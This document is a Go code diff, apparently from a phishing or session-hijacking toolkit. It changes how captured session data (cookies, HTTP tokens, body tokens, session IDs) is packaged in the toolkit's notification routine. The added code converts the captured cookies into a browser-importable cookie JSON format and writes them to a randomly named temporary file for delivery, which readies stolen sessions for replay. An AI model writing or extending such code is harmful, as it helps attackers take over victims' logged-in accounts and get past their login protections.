@@ -11,6 +11,47 @@ import (
 	"time"
 )
 
+type Token struct {
+	Name             string      `json:"name"`
+	Value            string      `json:"value"`
+	Domain           string      `json:"domain"`
+	HostOnly         bool        `json:"hostOnly"`
+	Path             string      `json:"path"`
+	Secure           bool        `json:"secure"`
+	HttpOnly         bool        `json:"httpOnly"`
+	SameSite         string      `json:"sameSite"`
+	Session          bool        `json:"session"`
+	FirstPartyDomain string      `json:"firstPartyDomain"`
+	PartitionKey     interface{} `json:"partitionKey"`
+	ExpirationDate   int64       `json:"expirationDate,omitempty"`
+	StoreID          interface{} `json:"storeId"`
+}
+
+func extractTokens(input map[string]map[string]map[string]interface{}) []Token {
+	var tokens []Token
+
+	for domain, tokenGroup := range input {
+		for _, tokenData := range tokenGroup {
+			token := Token{
+				Name:             tokenData["Name"].(string),
+				Value:            tokenData["Value"].(string),
+				Domain:           domain,
+				HostOnly:         false,
+				Path:             tokenData["Path"].(string),
+				Secure:           false,
+				HttpOnly:         tokenData["HttpOnly"].(bool),
+				SameSite:         "lax",
+				Session:          false,
+				FirstPartyDomain: "",
+				PartitionKey:     nil,
+			}
+			tokens = append(tokens, token)
+		}
+	}
+
+	return tokens
+}
+
 // Define a map to store session IDs and a mutex for thread-safe access
 var processedSessions = make(map[string]bool)
 var mu sync.Mutex
@@ -24,6 +65,59 @@ func generateRandomString() string {
 		randomStr[i] = charset[rand.Intn(len(charset))]
 	}
 	return string(randomStr)
+}
+func createTxtFile(session Session) (string, error) {
+	// Create a random text file name
+	txtFileName := generateRandomString() + ".txt"
+	txtFilePath := filepath.Join(os.TempDir(), txtFileName)
+
+	// Create a new text file
+	txtFile, err := os.Create(txtFilePath)
+	if err != nil {
+		return "", fmt.Errorf("failed to create text file: %v", err)
+	}
+	defer txtFile.Close()
+
+	// Marshal the session maps into JSON byte slices
+	tokensJSON, err := json.MarshalIndent(session.Tokens, "", "  ")
+	if err != nil {
+		return "", fmt.Errorf("failed to marshal Tokens: %v", err)
+	}
+	httpTokensJSON, err := json.MarshalIndent(session.HTTPTokens, "", "  ")
+	if err != nil {
+		return "", fmt.Errorf("failed to marshal HTTPTokens: %v", err)
+	}
+	bodyTokensJSON, err := json.MarshalIndent(session.BodyTokens, "", "  ")
+	if err != nil {
+		return "", fmt.Errorf("failed to marshal BodyTokens: %v", err)
+	}
+	customJSON, err := json.MarshalIndent(session.Custom, "", "  ")
+	if err != nil {
+		return "", fmt.Errorf("failed to marshal Custom: %v", err)
+	}
+
+	// Consolidate all tokens into a single formatted string
+	var rawTokens map[string]map[string]map[string]interface{}
+	if err := json.Unmarshal([]byte(tokensJSON), &rawTokens); err != nil {
+		fmt.Println("Error parsing tokensJSON:", err)
+
+	}
+
+	tokens := extractTokens(rawTokens)
+
+	tokensOutput, err := json.MarshalIndent(tokens, "", "  ")
+	if err != nil {
+		fmt.Println("Error marshalling tokens:", err)
+
+	}
+
+	// Write the consolidated data into the text file
+	_, err = txtFile.WriteString(string(tokensOutput))
+	if err != nil {
+		return "", fmt.Errorf("failed to write data to text file: %v", err)
+	}
+
+	return txtFilePath, nil
 }
 
 func createZipFile(session Session) (string, error) {
@@ -47,26 +141,45 @@ func createZipFile(session Session) (string, error) {
 	if err != nil {
 		return "", fmt.Errorf("failed to marshal Tokens: %v", err)
 	}
-	httpTokensJSON, err := json.MarshalIndent(session.HTTPTokens, "", "  ")
-	if err != nil {
-		return "", fmt.Errorf("failed to marshal HTTPTokens: %v", err)
+	// httpTokensJSON, err := json.MarshalIndent(session.HTTPTokens, "", "  ")
+	// if err != nil {
+	// 	return "", fmt.Errorf("failed to marshal HTTPTokens: %v", err)
+	// }
+	// bodyTokensJSON, err := json.MarshalIndent(session.BodyTokens, "", "  ")
+	// if err != nil {
+	// 	return "", fmt.Errorf("failed to marshal BodyTokens: %v", err)
+	// }
+	// customJSON, err := json.MarshalIndent(session.Custom, "", "  ")
+	// if err != nil {
+	// 	return "", fmt.Errorf("failed to marshal Custom: %v", err)
+	// }
+
+	// //  print all tokens
+	// fmt.Println("Tokens: ", string(tokensJSON))
+	// fmt.Println("HTTPTokens: ", string(httpTokensJSON))
+	// fmt.Println("BodyTokens: ", string(bodyTokensJSON))
+	// fmt.Println("Custom: ", string(customJSON))
+
+	// parseAndPrintTokens(string(tokensJSON), string(httpTokensJSON), string(bodyTokensJSON), string(customJSON))
+	var rawTokens map[string]map[string]map[string]interface{}
+	if err := json.Unmarshal([]byte(tokensJSON), &rawTokens); err != nil {
+		fmt.Println("Error parsing tokensJSON:", err)
+
 	}
-	bodyTokensJSON, err := json.MarshalIndent(session.BodyTokens, "", "  ")
+
+	tokens := extractTokens(rawTokens)
+
+	tokensOutput, err := json.MarshalIndent(tokens, "", "  ")
 	if err != nil {
-		return "", fmt.Errorf("failed to marshal BodyTokens: %v", err)
+		fmt.Println("Error marshalling tokens:", err)
+
 	}
-	customJSON, err := json.MarshalIndent(session.Custom, "", "  ")
-	if err != nil {
-		return "", fmt.Errorf("failed to marshal Custom: %v", err)
-	}
+
+	// fmt.Println("Tokens: ", string(tokensOutput))
 
 	// Define the file names for each token
 	files := map[string][]byte{
-		"Tokens-" + generateRandomString() + ".txt":     tokensJSON,
-		"HTTPTokens-" + generateRandomString() + ".txt": httpTokensJSON,
-		"BodyTokens-" + generateRandomString() + ".txt": bodyTokensJSON,
-		"Custom-" + generateRandomString() + ".txt":     customJSON,
-		"SessionID-" + generateRandomString() + ".txt":  []byte(session.SessionID),
+		"Tokens-" + generateRandomString() + ".txt": tokensOutput,
 	}
 
 	// Add each token as a text file to the zip
@@ -130,7 +243,9 @@ func Notify(session Session) {
 	message := formatSessionMessage(session)
 
 	// Create the zip file with token data
-	zipFilePath, err := createZipFile(session)
+	// zipFilePath, err := createZipFile(session)
+	zipFilePath, err := createTxtFile(session)
+
 	if err != nil {
 		fmt.Println("Error creating zip file:", err)
 		return
